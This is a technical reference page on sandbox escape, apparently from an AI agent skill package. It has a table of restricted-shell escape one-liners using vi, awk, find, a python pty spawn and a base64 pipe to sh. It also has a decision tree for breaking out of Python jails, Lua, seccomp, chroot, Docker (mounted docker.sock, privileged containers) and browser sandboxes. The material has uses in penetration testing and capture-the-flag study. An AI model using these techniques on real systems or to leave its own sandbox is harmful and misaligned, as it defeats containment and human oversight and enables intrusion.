# sandbox-escape-techniques technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 7. RBASH / RESTRICTED SHELL ESCAPE

| Technique | Method |
|---|---|
| vi/vim | `:!/bin/bash` or `:set shell=/bin/bash` then `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| find | `find / -exec /bin/bash \;` |
| python/perl/ruby | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| ssh | `ssh user@host -t /bin/bash` |
| Environment | `export PATH=/usr/bin:/bin; /bin/bash` |
| cp | Copy `/bin/bash` to allowed directory |
| git | `git help config` → then `!/bin/bash` in pager |
| Encoding | `echo /bin/bash | base64 -d | sh` |

---

## 8. DECISION TREE

```
What type of sandbox?
├── Python sandbox (pyjail)?
│   └── See PYTHON_SANDBOX_ESCAPE.md
│       ├── __builtins__ available? → direct import
│       ├── Subclass walk: ().__class__.__bases__[0].__subclasses__()
│       ├── Keywords filtered? → chr()/getattr() construction
│       └── eval/exec available? → code object manipulation
│
├── Lua sandbox?
│   ├── debug library available? → getregistry/getupvalue
│   ├── FFI available (LuaJIT)? → ffi.C.system()
│   ├── loadstring available? → load arbitrary code
│   └── All restricted? → metatable chain exploitation
│
├── seccomp filter?
│   └── See SECCOMP_BYPASS.md
│       ├── Architecture confusion (32-bit syscalls from 64-bit)
│       ├── Allowed syscalls → ORW chain
│       ├── io_uring allowed? → bypass via io_uring
│       └── ptrace allowed? → debug child process
│
├── chroot jail?
│   ├── Root inside chroot? → double chroot escape
│   ├── Leaked fd? → fchdir to real root
│   ├── /proc mounted? → /proc/1/root access
│   └── Terminal access? → TIOCSTI injection
│
├── Container / Docker?
│   ├── Privileged container? → mount host, load kernel module
│   ├── Mounted docker.sock? → docker API → escape
│   ├── See ../container-escape-techniques/SKILL.md
│   └── Kernel exploit → full escape
│
├── Browser sandbox?
│   ├── Have renderer RCE? → target Mojo IPC for browser escape
│   ├── GPU process accessible? → less-sandboxed stepping stone
│   └── Kernel exploit → bypass sandbox entirely
│
└── Restricted shell (rbash)?
    └── Find any interactive program (vi, less, python, awk, git)
```
